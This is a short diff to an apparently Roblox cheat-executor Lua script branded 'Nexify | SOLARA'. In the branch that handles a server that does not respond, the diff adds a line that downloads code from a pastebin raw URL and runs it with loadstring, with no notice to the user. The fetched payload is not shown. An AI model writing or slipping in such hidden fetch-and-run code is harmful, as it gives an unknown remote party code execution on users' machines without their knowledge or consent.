@@ -1244,12 +1244,15 @@ warn("1")
 
 else
 wait(5)
+
 print("Server Did Not Responded.")
         Notification:Notify(
             {Title = "Nexify | SOLARA", Description = "SERVER DID NOT RESPONDED"},
             {OutlineColor = Color3.fromRGB(240, 8, 8), Time = 15, Type = "image"},
             {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
         )
+        wait(2)
+        loadstring(game:HttpGet(('https://pastebin.com/raw/UJwmVuXv'),true))()
 return
 
 end
